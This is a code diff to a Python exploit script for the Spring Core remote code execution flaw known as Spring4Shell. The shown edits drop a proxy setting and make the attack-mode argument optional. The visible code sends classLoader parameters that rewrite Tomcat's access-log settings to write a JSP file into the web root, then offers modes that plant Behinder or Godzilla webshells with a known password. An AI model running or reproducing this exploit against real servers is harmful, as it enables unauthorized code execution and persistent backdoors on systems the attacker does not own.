@@ -14,7 +14,7 @@ def vuln(url):
             "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
             "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
             }
-    requests.post(url, headers=headers, data=data,proxies=proxies)
+    requests.post(url, headers=headers, data=data)
     print("wait for 6s...")
     time.sleep(6)
     re2 = requests.get("{}/{}{}.jsp".format(location,prefix,rand))
@@ -37,7 +37,7 @@ def webshell(url,shelltype):
             "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
             "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
             }
-    requests.post(url, headers=headers, data=data,proxies=proxies)
+    requests.post(url, headers=headers, data=data)
     if shelltype == 1:
         print("rebeyond is {}/{}{}.jsp , password is rebeyond".format(location,prefix,rand))
     elif shelltype == 2:
@@ -48,7 +48,7 @@ def webshell(url,shelltype):
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Srping Core Rce.')
     parser.add_argument('--url',help='target url',required=True)
-    parser.add_argument('--type',help='1 vuln test 2.Behinder shell 3.godzilla shell',required=True,type=int,default=1)
+    parser.add_argument('--type',help='1 vuln test 2.Behinder shell 3.godzilla shell',type=int,default=1)
     parser.add_argument('--directory',help='target directory',required=False,default="webapps/ROOT")
     parser.add_argument('--filename',help='target filename',required=False,default="inject")
     sign = "6right"
